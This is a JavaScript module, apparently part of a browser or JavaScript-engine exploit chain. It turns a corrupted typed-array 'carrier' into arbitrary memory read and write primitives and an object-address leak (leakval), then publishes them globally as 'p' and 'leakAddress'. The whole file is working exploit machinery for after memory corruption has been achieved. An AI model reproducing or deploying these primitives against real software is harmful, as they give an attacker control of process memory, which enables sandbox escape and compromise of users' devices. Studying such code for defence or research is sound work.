/**
 * mem.js — Memory Primitives & Carrier Management
 * Provides arbitrary read/write access via memory carrier
 */

import { int64 } from "./int64.js";

let carrier = null;
let carrierAddress = null;
let originalVector = null;
const pairStatus = {
  promoted: false,
  error: "primitive not installed"
};

function asWords(address) {
  if (address instanceof int64) {
    return {
      low: address.low >>> 0,
      high: address.hi >>> 0,
      number: address.low + address.hi * 0x100000000
    };
  }
  if (address && typeof address.low === "number" && typeof address.hi === "number") {
    return {
      low: address.low >>> 0,
      high: address.hi >>> 0,
      number: (address.low >>> 0) + (address.hi >>> 0) * 0x100000000
    };
  }
  if (typeof address !== "number" || !Number.isFinite(address) || address < 0) {
    throw new TypeError("Invalid address");
  }

  const high = Math.floor(address / 0x100000000) >>> 0;
  return {
    low: (address - high * 0x100000000) >>> 0,
    high,
    number: address
  };
}

function carrierView() {
  if (!carrier || !(carrier.view instanceof Uint8Array)) {
    throw new Error("Carrier not initialized");
  }
  return carrier.view;
}

function initCarrier(c, cAddr, origVec) {
  carrier = c;
  carrierAddress = cAddr;
  originalVector = origVec;
}

function aim(address) {
  if (!carrier) throw new Error("Carrier not initialized");
  if (typeof carrier.aim === "function") {
    carrier.aim(asWords(address).number);
    return;
  }

  const view = carrierView();
  const { low, high } = asWords(address);
  for (let i = 0; i < 8; i++) {
    const byteIndex = i < 4 ? i : i - 4;
    const value = i < 4 ? low : high;
    view[0x10 + i] = (value >> (byteIndex * 8)) & 0xff;
  }
}

function restore() {
  if (!carrier) throw new Error("Cannot restore carrier");
  if (typeof carrier.restore === "function") {
    carrier.restore();
    return;
  }
  if (!originalVector) throw new Error("Cannot restore carrier");
  aim(originalVector);
}

function read1(addr) {
  aim(addr);
  return carrierView()[0];
}

function read2(addr) {
  aim(addr);
  const view = carrierView();
  return view[0] + (view[1] << 8);
}

function read4(addr) {
  aim(addr);
  const view = carrierView();
  return (view[0] + (view[1] << 8) + (view[2] << 16) + (view[3] << 24)) >>> 0;
}

function read8(addr) {
  aim(addr);
  const view = carrierView();
  const low = (view[0] + (view[1] << 8) + (view[2] << 16) + (view[3] << 24)) >>> 0;
  const high = (view[4] + (view[5] << 8) + (view[6] << 16) + (view[7] << 24)) >>> 0;
  return new int64(low, high);
}

function write1(addr, value) {
  aim(addr);
  carrierView()[0] = value & 0xff;
}

function write2(addr, value) {
  aim(addr);
  const view = carrierView();
  view[0] = value & 0xff;
  view[1] = (value >> 8) & 0xff;
}

function write4(addr, value) {
  aim(addr);
  value = value >>> 0;
  const view = carrierView();
  view[0] = value & 0xff;
  view[1] = (value >> 8) & 0xff;
  view[2] = (value >> 16) & 0xff;
  view[3] = (value >> 24) & 0xff;
}

function write8(addr, value) {
  const words = asWords(value);
  aim(addr);
  const view = carrierView();
  view[0] = words.low & 0xff;
  view[1] = (words.low >> 8) & 0xff;
  view[2] = (words.low >> 16) & 0xff;
  view[3] = (words.low >> 24) & 0xff;
  view[4] = words.high & 0xff;
  view[5] = (words.high >> 8) & 0xff;
  view[6] = (words.high >> 16) & 0xff;
  view[7] = (words.high >> 24) & 0xff;
}

function leakval(obj) {
  if (!carrier || typeof carrier.setLeakSlot !== "function"
      || typeof carrier.clearLeakSlot !== "function") {
    if (typeof globalThis.leakAddress === "function" && globalThis.leakAddress !== leakval)
      return globalThis.leakAddress(obj);
    throw new Error("leakval: address leak not available");
  }

  carrier.setLeakSlot(obj);
  try {
    return read8(carrier.leakSlotAddress);
  } finally {
    carrier.clearLeakSlot();
    try { restore(); } catch (_) { }
  }
}

function assertHome() {
  if (!carrier) return false;
  if (typeof carrier.assertHome === "function")
    return carrier.assertHome();
  return carrierView()[0] === 0x3c;
}

function installWindowP(c, options = {}) {
  if (!c || typeof c.aim !== "function" || !(c.view instanceof Uint8Array)) {
    pairStatus.promoted = false;
    pairStatus.error = "invalid carrier";
    throw new Error("installWindowP: invalid carrier");
  }

  initCarrier(c, c.holderAddress ?? null, c.homeVector ?? null);

  const published = {
    aim,
    restore,
    read1,
    read2,
    read4,
    read8,
    write1,
    write2,
    write4,
    write8,
    leakval,
    assertHome
  };

  globalThis.p = published;
  globalThis.leakAddress = leakval;

  pairStatus.promoted = true;
  pairStatus.error = "";
  if (options && typeof options.onEvent === "function") {
    options.onEvent("PRIMITIVE-PAIR-PUBLISHED",
      "window-bytes=" + c.windowBytes + "-attempts=" + c.attempts);
  }
  return published;
}

export {
  initCarrier,
  aim,
  restore,
  read1, read2, read4, read8,
  write1, write2, write4, write8,
  leakval,
  assertHome,
  installWindowP,
  pairStatus
};
